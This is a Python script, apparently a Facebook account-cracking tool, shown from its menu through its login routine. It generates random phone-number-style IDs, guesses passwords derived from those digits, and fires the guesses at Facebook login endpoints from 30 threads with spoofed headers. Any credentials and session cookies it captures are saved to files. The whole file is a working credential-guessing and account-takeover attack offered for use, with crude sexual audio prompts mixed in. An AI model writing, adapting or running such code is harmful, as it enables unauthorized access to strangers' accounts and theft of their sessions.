    pt = input('\n\x1b[1;32m╠ 𝑪𝑯𝑶𝑶𝑺𝑬_\033[1;91m: \033[1;31m')

    if pt in ["1","01"]:

        create_audio("you choose 6 digit crack","test6.mp3")

        play_audio("test6.mp3")

        sixdg()

    if pt in ["2","02"]:

        create_audio("baby you choose 7 digit crack","test7.mp3")

        play_audio("test7.mp3")

        sevdg()

    if pt in ["3","03"]:

        create_audio("wow dear, you choose 8 digit crack ,,","test8.mp3")

        play_audio("test8.mp3")

        eigdg()

    if pt in ["4","04"]:

        create_audio("9digit crack starting","test9.mp3")

        play_audio("test9.mp3")

        nindg()

    if pt in ["5","05"]:

        create_audio("Oh my god ,baby you choose 10 digit crack","test10.mp3")

        play_audio("test10.mp3")

        tendg()

    if pt in ["6","06"]:

        create_audio("jan ,I love you, you choose 11 digit crack","test11.mp3")

        play_audio("test11.mp3")

        elavendg()

    if pt in ["0","00"]:

        create_audio("good by baby ","tezst.mp3")

        play_audio("tezst.mp3")

        sys.exit()

    if pt not in ["0","00","1","01","2","02","3","03","4","04","5","05","6","06"]:

        create_audio("baby choose the right option  ,you can choose option one , option 2 , option 3 ,but you can not use any letter","test12.mp3")

        play_audio("test12.mp3")

        menu()

def sixdg():

    user=[]

    _EMRAN_('clear')

    logo()

    print("\n")

    

    

    emran('\033[1;93m─────────────────────────────────────────')

    emran('\033[1;91m[\033[1;92m👅\033[1;91m]\033[1;37m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠 𝐶𝑜𝑑𝑒 - \033[1;30m016 \033[1;30m017 \033[1;30m018 \033[1;30m019')

    emran('\033[1;93m─────────────────────────────────────────\n')

    create_audio("Fuck me baby, choice the code","test111.mp3")

    play_audio("test111.mp3")

    kode = input('\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 :\33[1;97m')

    

    _EMRAN_('clear')

    logo()

    print("")

    

    limit = int(input('\033[1;92m𝑬𝒙𝒂𝒎𝒑𝒍𝒆: 2000, 5000, 10000, 40000\n\n\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 : '))

    

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(8))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        _EMRAN_('clear')

        logo()             

        tl = str(len(user))

        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")

        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')

        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')

        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")

        

        for guru in user:

            uid = kode+guru

            pwx = [guru[2:]]

            yaari.submit(rcrack,uid,pwx,tl)

    print('\n 𝐶𝑟𝑎𝑐𝑘 𝑃𝑟𝑜𝑠𝑠𝑒𝑠 𝐸𝑛𝑑𝑒𝑑 / 𝑰𝒅 𝑺𝒂𝒗𝒆𝒅 𝑻𝒐 𝑳𝒐𝒗𝒆𝑩𝒆𝒓𝒚.𝒕𝒙𝒕')

def sevdg():

    user=[]

    _EMRAN_('clear')

    logo()

    print("\n")

    

    emran('\033[1;93m─────────────────────────────────────────')

    emran('\033[1;91m[\033[1;92m👅\033[1;91m]\033[1;37m 𝐿𝑜𝑣𝑒𝐵𝑒𝑟𝑦 𝐶𝑜𝑑𝑒 - \033[1;30m016 \033[1;30m017 \033[1;30m018 \033[1;30m019')

    emran('\033[1;93m─────────────────────────────────────────\n')

    create_audio("Fuck me baby, choice the code","test111.mp3")

    play_audio("test111.mp3")

    kode = input('\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 :\33[1;97m')

    

    _EMRAN_('clear')

    logo()

    print("")

    

    limit = int(input('\033[1;92m𝑬𝒙𝒂𝒎𝒑𝒍𝒆: 2000, 5000, 10000, 40000\n\n\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 : '))

    

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(8))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        _EMRAN_('clear')

        logo()             

        tl = str(len(user))

        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")

        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')

        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')

        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")

        

        for guru in user:

            uid = kode+guru

            pwx = [guru[1:]]

            yaari.submit(rcrack,uid,pwx,tl)

    print('\n 𝐶𝑟𝑎𝑐𝑘 𝑃𝑟𝑜𝑠𝑠𝑒𝑠 𝐸𝑛𝑑𝑒𝑑 / 𝑰𝒅 𝑺𝒂𝒗𝒆𝒅 𝑻𝒐 𝑳𝒐𝒗𝒆𝑩𝒆𝒓𝒚.𝒕𝒙𝒕')

def eigdg():

    user=[]

    _EMRAN_('clear')

    logo()

    print("\n")

    

    emran('\033[1;93m─────────────────────────────────────────')

    emran('\033[1;91m[\033[1;92m👅\033[1;91m]\033[1;37m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠 𝐶𝑜𝑑𝑒 - \033[1;30m016 \033[1;30m017 \033[1;30m018 \033[1;30m019')

    emran('\033[1;93m─────────────────────────────────────────\n')

    kode = input('\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 :\33[1;97m')

    create_audio("Fuck me baby, choice the code","test111.mp3")

    play_audio("test111.mp3")

    _EMRAN_('clear')

    logo()

    print("")

    

    limit = int(input('\033[1;92m𝑬𝒙𝒂𝒎𝒑𝒍𝒆: 2000, 5000, 10000, 40000\n\n\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 : '))

    

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(8))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        _EMRAN_('clear')

        logo()             

        tl = str(len(user))

        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")

        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')

        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')

        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")

        

        for guru in user:

            uid = kode+guru

            pwx = [guru]

            yaari.submit(rcrack,uid,pwx,tl)

    print('\n 𝐶𝑟𝑎𝑐𝑘 𝑃𝑟𝑜𝑠𝑠𝑒𝑠 𝐸𝑛𝑑𝑒𝑑 / 𝑰𝒅 𝑺𝒂𝒗𝒆𝒅 𝑻𝒐 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠')

def nindg():

    user=[]

    _EMRAN_('clear')

    logo()

    print("\n")

    

    emran('\033[1;93m─────────────────────────────────────────')

    emran('\033[1;91m[\033[1;92m👅\033[1;91m]\033[1;37m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠 𝐶𝑜𝑑𝑒 - \033[1;30m016 \033[1;30m017 \033[1;30m018 \033[1;30m019')

    emran('\033[1;93m─────────────────────────────────────────\n')

    create_audio("Fuck me baby, choice the code","test111.mp3")

    play_audio("test111.mp3")

    kode = input('\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 :\33[1;97m')

    

    _EMRAN_('clear')

    logo()

    print("")

    

    limit = int(input('\033[1;92m𝑬𝒙𝒂𝒎𝒑𝒍𝒆: 2000, 5000, 10000, 40000\n\n\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 : '))

    

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(8))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        _EMRAN_('clear')

        logo()             

        tl = str(len(user))

        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")

        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')

        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')

        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")

        

        for guru in user:

            nxd=kode+guru

            uid = kode+guru

            pwx = [nxd[2:]]

            yaari.submit(rcrack,uid,pwx,tl)

    print('\n 𝐶𝑟𝑎𝑐𝑘 𝑃𝑟𝑜𝑠𝑠𝑒𝑠 𝐸𝑛𝑑𝑒𝑑 / 𝑰𝒅 𝑺𝒂𝒗𝒆𝒅 𝑻𝒐 𝑳𝒐𝒗𝒆𝑩𝒆𝒓𝒚.𝒕𝒙𝒕')

def tendg():

    user=[]

    _EMRAN_('clear')

    logo()

    print("\n")

    

    emran('\033[1;93m─────────────────────────────────────────')

    emran('\033[1;91m[\033[1;92m👅\033[1;91m]\033[1;37m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠 𝐶𝑜𝑑𝑒 - \033[1;30m016 \033[1;30m017 \033[1;30m018 \033[1;30m019')

    emran('\033[1;93m─────────────────────────────────────────\n')

    create_audio("Fuck me baby, choice the code","test111.mp3")

    play_audio("test111.mp3")

    kode = input('\033[1;91m𝑪𝒉𝒐??𝒔𝒆 :\33[1;97m')

    

    _EMRAN_('clear')

    logo()

    print("")

    

    limit = int(input('\033[1;92m𝑬𝒙𝒂𝒎𝒑𝒍𝒆: 2000, 5000, 10000, 40000\n\n\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 : '))

    

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(8))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        _EMRAN_('clear')

        logo()             

        tl = str(len(user))

        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")

        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')

        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')

        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")

        

        for guru in user:

            nxd=kode+guru

            uid = kode+guru

            pwx = [nxd[1:]]

            yaari.submit(rcrack,uid,pwx,tl)

    print('\n 𝐶𝑟𝑎𝑐𝑘 𝑃𝑟𝑜𝑠𝑠𝑒𝑠 𝐸𝑛𝑑𝑒𝑑 / 𝑰𝒅 𝑺𝒂𝒗𝒆𝒅 𝑻𝒐 𝑳𝒐𝒗𝒆𝑩𝒆𝒓𝒚.𝒕𝒙𝒕')

def elavendg():

    user=[]

    _EMRAN_('clear')

    logo()

    print("\n")

    

    

    emran('\033[1;93m─────────────────────────────────────────')

    emran('\033[1;91m[\033[1;92m👅\033[1;91m]\033[1;37m 𝐿𝑜𝑣𝑒𝐵𝑒𝑟𝑦 𝐶𝑜𝑑𝑒 - \033[1;30m016 \033[1;30m017 \033[1;30m018 \033[1;30m019')

    emran('\033[1;93m─────────────────────────────────────────\n')

    create_audio("Fuck me baby, choice the code","test111.mp3")

    play_audio("test111.mp3")

    kode = input('\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 :\33[1;97m')

    

    _EMRAN_('clear')

    logo()

    print("")

    

    limit = int(input('\033[1;92m𝑬𝒙𝒂𝒎𝒑𝒍𝒆: 2000, 5000, 10000, 40000\n\n\033[1;91m𝑪𝒉𝒐𝒐𝒔𝒆 : '))

    

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(8))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        _EMRAN_('clear')

        logo()             

        tl = str(len(user))

        print("\033[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐")

        print(f'\033[1;90m│\033[38;5;46m    𝑵𝒐𝒕𝒆/- 𝑻𝒉𝒊𝒔 𝑳𝒊𝒏𝒆 𝑶𝒏𝒍𝒚 𝑭𝒐𝒓 𝑯𝒂𝒕𝒆𝒓𝒔.\033[1;90m    │')

        print(f'\033[1;90m│\033[38;5;46m          \"𝒀𝒐𝒖𝒓 𝑷𝒂𝑷𝒂 𝑰𝒔 𝑩𝒂𝒄𝒌\"\033[1;90m            │')

        print("\033[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n")

        

        for guru in user:

            uid = kode+guru

            pwx = [kode+guru]

            yaari.submit(rcrack,uid,pwx,tl)

    print('\n 𝐶𝑟𝑎𝑐𝑘 𝑃𝑟𝑜𝑠𝑠𝑒𝑠 𝐸𝑛𝑑𝑒𝑑 / 𝑰𝒅 𝑺𝒂𝒗𝒆𝒅 𝑻𝒐 𝑳𝒐𝒗𝒆𝑩𝒆𝒓𝒚.𝒕𝒙𝒕')

emran_Brand=requests.get("https://pastebin.com/raw/E58uPwtm").text

if emran_Brand in ['free']:

	frist__link='https://free.facebook.com'	emranboss='free.facebook.com'

	request_link="https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"

	refar='https://free.facebook.com/'

if emran_Brand in ['m']:

	frist__link='https://m.facebook.com'

	emranboss='m.facebook.com'

	request_link="https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"

	refar='https://m.facebook.com/'

if emran_Brand in ['mbasic']:

	frist__link='https://mbasic.facebook.com'

	emranboss='mbasic.facebook.com'

	request_link="https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"

	refar='https://mbasic.facebook.com/'

if emran_Brand in ['p']:

	frist__link='https://p.facebook.com'

	emranboss='p.facebook.com'

	request_link="https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"

	refar='https://p.facebook.com/'

if emran_Brand in ['x']:

	frist__link='https://x.facebook.com'

	emranboss='x.facebook.com'

	request_link="https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"

	refar='https://x.facebook.com/'

if emran_Brand in ['web']:

	frist__link='https://free.facebook.com'

	emranboss='web.facebook.com'

	request_link="https://web.facebook.com/login/device-based/regular/login/?refsrc"

	refar='https://web.facebook.com/'

def rcrack(uid,pwx,tl):

    #user(1)

    global loop

    global cps

    global oks

    try:

        for ps in pwx:

            ctly=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])

            pro = random.choice(mahi_agent)

            session = requests.Session()

            afrd= str(datetime.now()-current).split('.')[0]

            free_fb = session.get(frist__link).text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {"authority": emranboss,

            "method": 'GET',

            "scheme": 'https',

            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',

            "accept-encoding": 'gzip, deflate, br',

            "accept-language": 'en-US,en;q=1',

            'cache-control': 'no-cache, no-store, must-revalidate',

            "referer": refar,

            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',

            "sec-ch-ua-mobile": '?0',

            "sec-ch-ua-platform": "Windows",

            "sec-fetch-dest": 'document',

            "sec-fetch-mode": 'navigate',

            "sec-fetch-site": 'same-origin',

            "sec-fetch-user": '?1',

            "pragma": 'no-cache',

            "priority": 'u=1',

            'cross-origin-resource-policy': 'cross-origin',

            "upgrade-insecure-requests": '1',

            "user-agent": pro}

            lo = session.post(request_link,data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[151:166]

                print('\r\r\033[38;5;46m[\033[1;34m𝑳𝑶𝑽𝑬-𝑩𝑬𝑹𝒀\033[1;32m]\033[1;31m>\033[38;5;46m ' +uid+ ' \033[1;31m| \033[1;32m' +ps+'\n\033[1;30m[\033[1;31m\033[1;47m𝑪𝑶𝑶𝑲𝑰𝑬\033[00m\033[1;30m]\033[1;37m= '+coki+'  \033[0;90m\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0;97m\n')

                create_audio("Baby Congratulations ,I got a ok id","test1181.mp3")

                play_audio("test1181.mp3")

                open('/sdcard/𝑳𝒐𝒗𝒆𝑩𝒆𝒓𝒚_𝒐𝒌.txt', 'a').write( uid+' | '+ps+'\n')

                open('/sdcard/𝑳𝒐𝒗𝒆𝑩𝒆𝒓𝒚_𝑪𝒐𝒐𝒌𝒆.txt', 'a').write( coki+'\n\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[24:39]

                txxx=random.choice(["Fuck me","I love you","baby come with me","omg"])

                #print('\r\r\n\033[1;30m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[38;5;46m[\033[1;34m𝑳𝑶𝑽𝑬-𝑩𝑬𝑹𝒀\033[1;32m]\033[1;31m>\033[38;5;46m ' +uid+ ' \033[1;31m| \033[1;32m' +ps+'\n\033[1;30m[\033[1;31m\033[1;47m𝑪𝑶𝑶𝑲𝑰𝑬\033[00m\033[1;30m]\033[1;37m= '+coki+'  \033[0;90m\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0;97m\n')

                create_audio(f"{txxx}","st111.mp3")

                play_audio("st111.mp3")

                cps.append(cid)

                break

            else:

                continue

        loop+=1

        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])

        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])

        emoji=random.choice(['👌','😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','??','💛','🖤','🤎','??','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','??','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','??','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','??','🧀','🍤','🇧🇩','☠️'])

        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])

        sys.stdout.write(f"\r\33[1;90m[{colr}🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝\33[1;90m]{colo}✘\033[1;30m[{colo}{loop}|{'{:.1%}'.format(loop/int(tl))}\033[1;30m]-[{colo}{afrd}\033[1;30m]\33[1;90m[{emoji}] "),

        sys.stdout.flush()

    except:

        pass

EMRAN()
